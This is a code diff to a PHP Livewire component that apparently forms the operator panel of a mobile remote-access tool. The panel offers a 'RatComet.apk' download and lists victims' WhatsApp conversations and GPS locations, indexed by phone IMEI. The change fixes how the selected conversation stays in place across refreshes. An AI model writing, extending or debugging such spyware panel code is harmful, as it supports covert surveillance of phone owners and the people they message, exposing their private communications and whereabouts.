@@ -37,6 +37,7 @@ class Home extends Component
     public $whatsappList = [];
     public $whatsappConversationList = [];
     public $selectedWhatsappConversation;
+    private $skipFirst = 0;
 
     public function showWhatsapp() {
         $this->resetChoice();
@@ -46,6 +47,7 @@ class Home extends Component
         return Storage::download('public/mobile/RatComet.apk', "RatComet.apk",['Content-Type'=>'application/vnd.android.package-archive','Content-Disposition'=>'attachment;filename="RatComet.apk"',]);
     }
     public function showWhatsappConversation($contact) {
+        $this->skipFirst = 1;
         $this->selectedWhatsappConversation = $contact;
         $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $contact])->get();
     }
@@ -152,10 +154,12 @@ class Home extends Component
             $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude')->toArray();
 
         }else if($this->menu == '7') {
-            $this->whatsappList = SocialApp::orderBy('position','DESC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact')->sortByDesc('currentDate');
-            if($this->whatsappList->count() != 0){
-                $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
-                $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
+            if($this->skipFirst == 0) {
+                $this->whatsappList = SocialApp::orderBy('position','DESC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact')->sortByDesc('currentDate');
+                if($this->whatsappList->count() != 0){
+                    $this->selectedWhatsappConversation = $this->whatsappList->first()->contact;
+                    $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
+                }
             }
         }else{
 
